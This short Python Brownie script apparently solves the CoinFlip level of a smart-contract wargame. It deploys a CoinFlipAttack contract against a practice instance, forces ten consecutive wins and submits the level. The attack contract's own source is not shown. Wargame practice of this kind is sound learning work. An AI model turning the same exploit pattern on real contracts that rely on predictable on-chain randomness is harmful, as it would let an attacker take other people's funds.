from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    CoinFlipAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    network.gas_limit(500000)
    player = get_account()
    instance_address = get_new_instance(level_id=3, player=player)

    coin_flip_contract = interface.ICoinFlip(instance_address)
    attack_contract = CoinFlipAttack.deploy(instance_address, {"from": player})

    for _ in range(10):
        tx = attack_contract.flipToWin({"from": player, "allow_revert": True})
        tx.wait(1)

        print(f"Consecutive wins: {coin_flip_contract.consecutiveWins()}")

    submit_instance(instance_address, player)
